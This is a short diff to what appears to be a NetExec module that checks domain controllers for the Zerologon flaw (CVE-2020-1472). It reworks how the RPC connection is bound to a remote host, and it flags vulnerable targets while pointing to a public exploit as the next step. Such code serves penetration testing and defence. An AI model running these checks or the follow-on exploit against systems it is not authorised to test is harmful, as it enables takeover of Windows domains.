@@ -26,7 +26,7 @@ class NXCModule:
 
     def on_login(self, context, connection):
         self.context = context
-        if self.perform_attack("\\\\" + connection.hostname, connection.host, connection.hostname):
+        if self.perform_attack("\\\\" + connection.hostname, connection.host, connection.hostname, connection.host):
             self.context.log.highlight("VULNERABLE")
             self.context.log.highlight("Next step: https://github.com/dirkjanm/CVE-2020-1472")
             try:
@@ -43,13 +43,15 @@ class NXCModule:
             except Exception:
                 self.context.log.debug("Error updating zerologon status in database")
 
-    def perform_attack(self, dc_handle, dc_ip, target_computer):
+    def perform_attack(self, dc_handle, dc_ip, target_computer, remoteHost):
         # Keep authenticating until successful. Expected average number of attempts needed: 256.
         self.context.log.debug("Performing authentication attempts...")
         rpc_con = None
         try:
-            binding = epm.hept_map(dc_ip, nrpc.MSRPC_UUID_NRPC, protocol="ncacn_ip_tcp")
-            rpc_con = transport.DCERPCTransportFactory(binding).get_dce_rpc()
+            binding = epm.hept_map(remoteHost, nrpc.MSRPC_UUID_NRPC, protocol="ncacn_ip_tcp")
+            rpc_con_ = transport.DCERPCTransportFactory(binding.replace(remoteHost, dc_ip))
+            rpc_con_.setRemoteHost(remoteHost)
+            rpc_con = rpc_con_.get_dce_rpc()
             rpc_con.connect()
             rpc_con.bind(nrpc.MSRPC_UUID_NRPC)
             for _attempt in range(MAX_ATTEMPTS):
